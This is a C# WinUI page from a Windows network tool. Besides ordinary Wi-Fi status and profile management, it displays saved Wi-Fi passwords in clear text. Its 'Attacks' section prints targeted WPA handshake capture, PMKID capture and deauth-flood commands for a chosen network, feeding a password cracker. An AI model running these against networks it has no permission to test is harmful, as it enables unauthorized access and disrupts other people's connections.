using Microsoft.UI.Xaml;
using Microsoft.UI.Xaml.Controls;
using Microsoft.UI.Xaml.Media;
using Microsoft.UI.Xaml.Navigation;
using WinNetControl.Core;
using WinNetControl.ViewModels;
using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.Linq;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace WinNetControl.Pages;

public class WifiNetwork
{
    public string Ssid      { get; set; } = "";
    public string Bssid     { get; set; } = "";
    public string Signal    { get; set; } = "";
    public string Auth      { get; set; } = "";
    public string Band      { get; set; } = "";
    public string Channel   { get; set; } = "";
    public int    SignalPct { get; set; }
    public SolidColorBrush SignalBrush => new(SignalPct >= 70
        ? Windows.UI.Color.FromArgb(255, 16, 124, 16)
        : SignalPct >= 40
            ? Windows.UI.Color.FromArgb(255, 251, 188, 5)
            : Windows.UI.Color.FromArgb(255, 224, 32, 32));
}

public sealed partial class WirelessPage : Page
{
    private readonly ObservableCollection<WifiNetwork> _networks = new();
    private readonly ObservableCollection<string>       _profiles = new();
    private WifiNetwork? _selectedNetwork;

    public WirelessPage()
    {
        this.InitializeComponent();
        NetworkList.ItemsSource = _networks;
        ProfileList.ItemsSource = _profiles;
    }

    protected override void OnNavigatedTo(NavigationEventArgs e)
    {
        base.OnNavigatedTo(e);
        _ = RefreshAll();
    }

    private void OnRefresh(object sender, RoutedEventArgs e) => _ = RefreshAll();

    private async Task RefreshAll()
    {
        await Task.WhenAll(LoadCurrentConnection(), LoadNearbyNetworks(), LoadProfiles());
    }

    // ── Current connection ────────────────────────────────────────────────────
    private async Task LoadCurrentConnection()
    {
        string raw = await RunNetshAsync("wlan show interfaces");
        if (string.IsNullOrWhiteSpace(raw)) return;

        string Get(string key) =>
            Regex.Match(raw, $@"{Regex.Escape(key)}\s*:\s*(.+)", RegexOptions.IgnoreCase).Groups[1].Value.Trim();

        string ssid   = Get("SSID");
        string signal = Get("Signal");
        string bssid  = Get("BSSID");
        string auth   = Get("Authentication");
        string cipher = Get("Cipher");
        string radio  = Get("Radio type");
        string band   = Get("Band");
        string channel = Get("Channel");
        string rxRate  = Get("Receive rate");
        string txRate  = Get("Transmit rate");
        string profile = Get("Profile");

        int signalPct = 0;
        if (int.TryParse(Regex.Match(signal, @"\d+").Value, out int sp)) signalPct = sp;

        // FIX Bug#25: GetAllNetworkInterfaces() is backed by WMI/IPHLPAPI and can
        // block the calling thread for 2-3 s on first call. Move it to the thread
        // pool so the UI never freezes while the wireless page loads or refreshes.
        string ip = await Task.Run(() =>
        {
            try
            {
                foreach (var ni in System.Net.NetworkInformation.NetworkInterface.GetAllNetworkInterfaces())
                {
                    if (ni.NetworkInterfaceType == System.Net.NetworkInformation.NetworkInterfaceType.Wireless80211 &&
                        ni.OperationalStatus == System.Net.NetworkInformation.OperationalStatus.Up)
                    {
                        var addr = ni.GetIPProperties().UnicastAddresses
                            .FirstOrDefault(a => a.Address.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork);
                        if (addr != null) return addr.Address.ToString();
                        break;
                    }
                }
            }
            catch { }
            return "—";
        });

        DispatcherQueue.TryEnqueue(() =>
        {
            ConnectedSsid.Text = string.IsNullOrEmpty(ssid) ? "Not connected" : ssid;
            ConnSignal.Text    = $"Signal: {signal}";
            ConnBand.Text      = band;
            ConnProtocol.Text  = radio;
            ConnChannel.Text   = channel.Length > 0 ? $"Ch {channel}" : "";
            ConnBssid.Text     = bssid.Length > 0 ? bssid : "—";
            ConnAuth.Text      = auth.Length > 0 ? auth : "—";
            ConnCipher.Text    = cipher.Length > 0 ? cipher : "—";
            ConnRadio.Text     = radio.Length > 0 ? radio : "—";
            ConnRxRate.Text    = rxRate.Length > 0 ? $"{rxRate} Mbps" : "—";
            ConnTxRate.Text    = txRate.Length > 0 ? $"{txRate} Mbps" : "—";
            ConnIp.Text        = ip;
            ConnProfile.Text   = profile.Length > 0 ? profile : "—";
            SignalPct.Text     = signalPct > 0 ? $"{signalPct}%" : "—";
            SignalBar.Value    = signalPct;
        });
    }


    // ── Nearby networks ───────────────────────────────────────────────────────
    private async void OnScanNetworks(object sender, RoutedEventArgs e)
    {
        DispatcherQueue.TryEnqueue(() =>
        {
            ScanRing.Visibility = Visibility.Visible;
            ScanRing.IsActive   = true;
            NetworkCount.Text   = "Scanning…";
            _networks.Clear();
        });

        await LoadNearbyNetworks();

        DispatcherQueue.TryEnqueue(() =>
        {
            ScanRing.IsActive   = false;
            ScanRing.Visibility = Visibility.Collapsed;
        });
    }

    private async Task LoadNearbyNetworks()

    {
        string raw = await RunNetshAsync("wlan show networks mode=bssid");
        if (string.IsNullOrWhiteSpace(raw)) return;

        var result = new List<WifiNetwork>();
        // Split into blocks per SSID
        var blocks = Regex.Split(raw, @"SSID\s+\d+\s*:", RegexOptions.IgnoreCase)
            .Where(b => b.Trim().Length > 0).ToList();

        foreach (var block in blocks)
        {
            string Get(string key) =>
                Regex.Match(block, $@"{Regex.Escape(key)}\s*:\s*(.+)", RegexOptions.IgnoreCase).Groups[1].Value.Trim();

            string ssid    = block.Split('\n').First().Trim();
            string auth    = Get("Authentication");
            string bssid   = Get("BSSID");
            string signal  = Get("Signal");
            string band    = Get("Band");
            string channel = Get("Channel");

            int signalPct = 0;
            if (int.TryParse(Regex.Match(signal, @"\d+").Value, out int sp)) signalPct = sp;

            if (ssid.Length == 0 && bssid.Length == 0) continue;

            result.Add(new WifiNetwork
            {
                Ssid      = ssid.Length > 0 ? ssid : "<hidden>",
                Bssid     = bssid,
                Signal    = $"{signalPct}%",
                Auth      = auth,
                Band      = band,
                Channel   = channel,
                SignalPct = signalPct
            });
        }

        var sorted = result.OrderByDescending(n => n.SignalPct).ToList();
        DispatcherQueue.TryEnqueue(() =>
        {
            _networks.Clear();
            foreach (var n in sorted) _networks.Add(n);
            NetworkCount.Text = $"{sorted.Count} networks";
        });
    }

    // ── Saved profiles ────────────────────────────────────────────────────────
    private async Task LoadProfiles()
    {
        string raw = await RunNetshAsync("wlan show profiles");
        var matches = Regex.Matches(raw, @"All User Profile\s*:\s*(.+)", RegexOptions.IgnoreCase);
        var names   = matches.Select(m => m.Groups[1].Value.Trim()).ToList();

        DispatcherQueue.TryEnqueue(() =>
        {
            _profiles.Clear();
            foreach (var n in names) _profiles.Add(n);
        });
    }

    private async void OnDeleteProfile(object sender, RoutedEventArgs e)
    {
        if (ProfileList.SelectedItem is string name)
        {
            var dlg = new ContentDialog
            {
                Title   = "Delete Wi-Fi Profile",
                Content = $"Delete saved profile '{name}'?",
                PrimaryButtonText   = "Delete",
                SecondaryButtonText = "Cancel",
                XamlRoot = this.XamlRoot
            };
            if (await dlg.ShowAsync() != ContentDialogResult.Primary) return;

            await RunElevatedAsync("netsh", $"wlan delete profile name=\"{name}\"");
            ProfileStatus.Text = $"Deleted profile: {name}";
            await LoadProfiles();
        }
        else
        {
            ProfileStatus.Text = "Select a profile first.";
        }
    }

    // ── Connect to network / profile (INCOMPLETE-002) ─────────────────────────
    private async void OnConnectToProfile(object sender, RoutedEventArgs e)
    {
        string? profile = ProfileList.SelectedItem as string;
        if (string.IsNullOrEmpty(profile))
        {
            ProfileStatus.Text = "Select a saved profile to connect.";
            return;
        }
        ProfileStatus.Text = $"Connecting to '{profile}'…";
        string result = await Task.Run(() =>
        {
            try
            {
                var psi = new System.Diagnostics.ProcessStartInfo("netsh",
                    $"wlan connect name=\"{profile}\"")
                { RedirectStandardOutput = true, UseShellExecute = false, CreateNoWindow = true };
                using var p = System.Diagnostics.Process.Start(psi)!;
                string o = p.StandardOutput.ReadToEnd();
                p.WaitForExit();
                return o.Trim();
            }
            catch (Exception ex) { return $"Error: {ex.Message}"; }
        });
        ProfileStatus.Text = result.Contains("successfully", StringComparison.OrdinalIgnoreCase)
            ? $"✅ Connected to '{profile}'" : result;
        if (result.Contains("successfully", StringComparison.OrdinalIgnoreCase))
            await Task.Delay(1500).ContinueWith(_ => DispatcherQueue.TryEnqueue(() => _ = LoadCurrentConnection()));
    }

    private async void OnShowProfilePassword(object sender, RoutedEventArgs e)
    {
        string? profile = ProfileList.SelectedItem as string;
        if (string.IsNullOrEmpty(profile))
        {
            ProfileStatus.Text = "Select a saved profile first.";
            return;
        }
        // Elevated: netsh wlan show profile key=clear
        string key = await Task.Run(() =>
        {
            try
            {
                var psi = new System.Diagnostics.ProcessStartInfo("netsh",
                    $"wlan show profile name=\"{profile}\" key=clear")
                { RedirectStandardOutput = true, UseShellExecute = false, CreateNoWindow = true };
                using var p = System.Diagnostics.Process.Start(psi)!;
                string o = p.StandardOutput.ReadToEnd();
                p.WaitForExit();
                var m = System.Text.RegularExpressions.Regex.Match(o,
                    @"Key Content\s*:\s*(.+)", System.Text.RegularExpressions.RegexOptions.IgnoreCase);
                return m.Success ? m.Groups[1].Value.Trim() : "(not found or not stored)";
            }
            catch (Exception ex) { return $"Error: {ex.Message}"; }
        });

        var dlg = new ContentDialog
        {
            Title   = $"Password — {profile}",
            Content = $"Wi-Fi Password:\n\n{key}",
            PrimaryButtonText = "Copy",
            CloseButtonText   = "Close",
            XamlRoot          = this.XamlRoot
        };
        var result = await dlg.ShowAsync();
        if (result == ContentDialogResult.Primary)
        {
            var dp = new Windows.ApplicationModel.DataTransfer.DataPackage();
            dp.SetText(key);
            Windows.ApplicationModel.DataTransfer.Clipboard.SetContent(dp);
            ProfileStatus.Text = "Password copied to clipboard.";
        }
    }

    // ── Network Target Selection & Attacks ─────────────────────────────────────

    private void OnSelectNetworkClicked(object sender, RoutedEventArgs e)
    {
        if (sender is Button btn && btn.Tag is WifiNetwork network)
            SelectNetwork(network);
    }

    private void SelectNetwork(WifiNetwork network)
    {
        _selectedNetwork = network;
        DispatcherQueue.TryEnqueue(() =>
        {
            TargetSsid.Text  = network.Ssid;
            TargetBssid.Text = network.Bssid.Length > 0 ? network.Bssid : "—";
            TargetAuth.Text  = network.Auth.Length  > 0 ? network.Auth  : "—";
            AttackOutputBox.Text = "";
            AttackTargetPanel.Visibility = Visibility.Visible;
            // Scroll the panel into view by scrolling the parent ScrollViewer
            AttackTargetPanel.StartBringIntoView();
        });
    }

    private void OnClearTarget(object sender, RoutedEventArgs e)
    {
        _selectedNetwork = null;
        DispatcherQueue.TryEnqueue(() =>
        {
            AttackTargetPanel.Visibility = Visibility.Collapsed;
            AttackOutputBox.Text = "";
        });
    }

    private void AppendAttack(string line)
    {
        DispatcherQueue.TryEnqueue(() =>
        {
            AttackOutputBox.Text += line + "\n";
            // Auto-scroll
            AttackOutputBox.Select(AttackOutputBox.Text.Length, 0);
        });
    }

    private async void OnWpaHandshake(object sender, RoutedEventArgs e)
    {
        if (_selectedNetwork == null) return;
        AppendAttack($"[→] Target: {_selectedNetwork.Ssid}  ({_selectedNetwork.Bssid})");
        AppendAttack("[→] WPA Handshake requires a monitor-mode capable adapter...");
        await Task.Delay(200);

        // Check for airodump-ng in WSL
        bool hasAirodump = await Task.Run(() =>
        {
            try
            {
                var psi = new System.Diagnostics.ProcessStartInfo("wsl", "-e which airodump-ng")
                { RedirectStandardOutput = true, UseShellExecute = false, CreateNoWindow = true };
                using var p = System.Diagnostics.Process.Start(psi)!;
                string o = p.StandardOutput.ReadToEnd(); p.WaitForExit();
                return o.Trim().Length > 0;
            }
            catch { return false; }
        });

        if (hasAirodump)
        {
            AppendAttack("[✓] airodump-ng found in WSL.");
            AppendAttack($"[HINT] Run in WSL terminal:");
            AppendAttack($"      sudo airodump-ng -c {_selectedNetwork.Channel} --bssid {_selectedNetwork.Bssid} -w capture wlan0mon");
            AppendAttack("[HINT] Then use 'Convert .cap → .hc22000' on the WPA Cracker tab.");
        }
        else
        {
            AppendAttack("[WARN] airodump-ng not found in WSL.");
            AppendAttack("[HINT] Install: sudo apt install aircrack-ng");
            AppendAttack("[HINT] Enable monitor mode: sudo airmon-ng start wlan0");
            AppendAttack($"[HINT] Capture: sudo airodump-ng -c {_selectedNetwork.Channel} --bssid {_selectedNetwork.Bssid} -w capture wlan0mon");
            AppendAttack("[INFO] Requires a USB Wi-Fi adapter supporting monitor mode.");
        }

        AppendAttack("\n[→] After capturing, go to GPU Cracker tab to crack the password.");
    }

    private async void OnPmkidAttack(object sender, RoutedEventArgs e)
    {
        if (_selectedNetwork == null) return;
        AppendAttack($"[→] PMKID attack on: {_selectedNetwork.Ssid}  ({_selectedNetwork.Bssid})");
        AppendAttack("[INFO] PMKID does not require a connected client or deauth.");
        await Task.Delay(200);

        bool hasHcxdump = await Task.Run(() =>
        {
            try
            {
                var psi = new System.Diagnostics.ProcessStartInfo("wsl", "-e which hcxdumptool")
                { RedirectStandardOutput = true, UseShellExecute = false, CreateNoWindow = true };
                using var p = System.Diagnostics.Process.Start(psi)!;
                string o = p.StandardOutput.ReadToEnd(); p.WaitForExit();
                return o.Trim().Length > 0;
            }
            catch { return false; }
        });

        if (hasHcxdump)
        {
            AppendAttack("[✓] hcxdumptool found.");
            string bssidFilter = _selectedNetwork.Bssid.Replace(":", "");
            AppendAttack("[HINT] Run in WSL terminal:");
            AppendAttack($"      sudo hcxdumptool -i wlan0 --filtermode=2 --filterlist_ap={bssidFilter} -o pmkid.pcapng");
            AppendAttack("      hcxpcapngtool -o pmkid.hc22000 pmkid.pcapng");
            AppendAttack("[→] Then load pmkid.hc22000 in the GPU Cracker tab.");
        }
        else
        {
            AppendAttack("[WARN] hcxdumptool not found in WSL.");
            AppendAttack("[HINT] Install: sudo apt install hcxdumptool hcxtools");
            AppendAttack("[HINT] Then re-try PMKID Capture.");
        }
    }

    private void OnDeauthFlood(object sender, RoutedEventArgs e)
    {
        if (_selectedNetwork == null) return;
        AppendAttack($"[→] Deauth Flood target: {_selectedNetwork.Ssid}  ({_selectedNetwork.Bssid})");
        AppendAttack("[WARN] Deauthentication requires monitor mode + packet injection capability.");
        AppendAttack("[WARN] Use ONLY on networks you own or have explicit permission to test.");
        AppendAttack("[INFO] Most built-in Wi-Fi adapters cannot inject packets.");
        AppendAttack("[HINT] Use a USB adapter supporting injection (e.g. Alfa AWUS036NH).");
        AppendAttack("[HINT] Run in WSL: sudo airmon-ng start wlan0");
        AppendAttack($"[HINT]           sudo aireplay-ng --deauth 50 -a {_selectedNetwork.Bssid} wlan0mon");
        AppendAttack("[→] Deauth forces clients to reconnect → captures WPA handshake.");
    }

    private void OnGoToGpuCracker(object sender, RoutedEventArgs e)
    {
        if (App.MainWindow is MainWindow mw)
            mw.NavigateTo("HashcatPage");
    }

    // ── Helpers ───────────────────────────────────────────────────────────────

    private static Task<string> RunNetshAsync(string args) => Task.Run(() =>
    {
        try
        {
            var psi = new System.Diagnostics.ProcessStartInfo("netsh", args)
            {
                RedirectStandardOutput = true,
                UseShellExecute        = false,
                CreateNoWindow         = true
            };
            using var proc = System.Diagnostics.Process.Start(psi)!;
            string output = proc.StandardOutput.ReadToEnd();
            proc.WaitForExit();
            return output;
        }
        catch { return ""; }
    });

    private static Task RunElevatedAsync(string exe, string args) => Task.Run(() =>
    {
        if (exe.Equals("netsh", StringComparison.OrdinalIgnoreCase))
            ElevatedRunner.RunNetsh(args);
        else
            ElevatedRunner.RunPowerShell(args);
    });
}
